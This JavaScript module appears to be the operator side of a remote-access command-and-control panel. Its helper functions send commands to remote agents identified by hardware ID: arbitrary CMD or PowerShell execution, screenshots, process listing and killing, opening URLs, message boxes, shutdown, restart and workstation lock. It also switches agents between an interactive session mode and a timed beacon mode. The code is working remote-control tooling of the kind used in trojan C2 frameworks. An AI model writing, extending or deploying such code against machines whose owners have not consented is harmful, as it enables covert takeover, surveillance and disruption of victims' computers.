import { sentinelSocket } from './websocket'

/**
 * Command Types Enum
 */
export const CommandType = {
  SHELL: 'SHELL',
  SCREENSHOT: 'SCREENSHOT',
  KILL_PROC: 'KILL_PROC',
  MESSAGE: 'MESSAGE',
  PROCESS_LIST: 'PROCESS_LIST',
  OPEN_URL: 'OPEN_URL',
  SHUTDOWN: 'SHUTDOWN',
  SWITCH_MODE: 'SWITCH_MODE',
}

/**
 * Shell Types
 */
export const ShellType = {
  CMD: 'CMD',
  POWERSHELL: 'POWERSHELL',
}

/**
 * Communication Modes
 */
export const CommunicationMode = {
  SESSION: 'SESSION',
  BEACON: 'BEACON',
}

/**
 * Command Helper Functions
 */
export const commands = {
  /**
   * Execute shell command
   * @param {string} hwid - Target agent
   * @param {string} command - Command to execute
   * @param {string} shellType - CMD or POWERSHELL
   */
  shell: (hwid, command, shellType = ShellType.CMD) => {
    const params =
      shellType === ShellType.POWERSHELL
        ? ['powershell', '-c', command]
        : ['cmd', '/c', command]

    return sentinelSocket.sendCommand(hwid, CommandType.SHELL, params)
  },

  /**
   * Take screenshot
   * @param {string} hwid - Target agent
   */
  screenshot: (hwid) => {
    return sentinelSocket.sendCommand(hwid, CommandType.SCREENSHOT, [])
  },

  /**
   * Kill process by name
   * @param {string} hwid - Target agent
   * @param {string} processName - Process name to kill
   */
  killProcess: (hwid, processName) => {
    return sentinelSocket.sendCommand(hwid, CommandType.KILL_PROC, [processName])
  },

  /**
   * Show message box
   * @param {string} hwid - Target agent
   * @param {string} title - Message title
   * @param {string} message - Message body
   */
  message: (hwid, title, message) => {
    return sentinelSocket.sendCommand(hwid, CommandType.MESSAGE, [title, message])
  },

  /**
   * Get process list
   * @param {string} hwid - Target agent
   */
  processList: (hwid) => {
    return sentinelSocket.sendCommand(hwid, CommandType.PROCESS_LIST, [])
  },

  /**
   * Open URL in default browser
   * @param {string} hwid - Target agent
   * @param {string} url - URL to open
   */
  openUrl: (hwid, url) => {
    return sentinelSocket.sendCommand(hwid, CommandType.OPEN_URL, [url])
  },

  /**
   * Shutdown target computer
   * @param {string} hwid - Target agent
   */
  shutdown: (hwid) => {
    return sentinelSocket.sendCommand(hwid, CommandType.SHUTDOWN, [])
  },

  /**
   * Restart target computer
   * @param {string} hwid - Target agent
   */
  restart: (hwid) => {
    // Shutdown with restart flag via shell
    return sentinelSocket.sendCommand(hwid, CommandType.SHELL, [
      'shutdown',
      '/r',
      '/t',
      '0',
    ])
  },

  /**
   * Lock workstation
   * @param {string} hwid - Target agent
   */
  lock: (hwid) => {
    return sentinelSocket.sendCommand(hwid, CommandType.SHELL, [
      'rundll32.exe',
      'user32.dll,LockWorkStation',
    ])
  },

  /**
   * Switch communication mode
   * @param {string} hwid - Target agent
   * @param {string} mode - SESSION or BEACON
   * @param {number} interval - Beacon interval in seconds (only for BEACON mode)
   */
  switchMode: (hwid, mode, interval = null) => {
    const params = mode === CommunicationMode.BEACON && interval
      ? ['beacon', interval.toString()]
      : ['session']

    return sentinelSocket.sendCommand(hwid, CommandType.SWITCH_MODE, params)
  },
}

export default commands
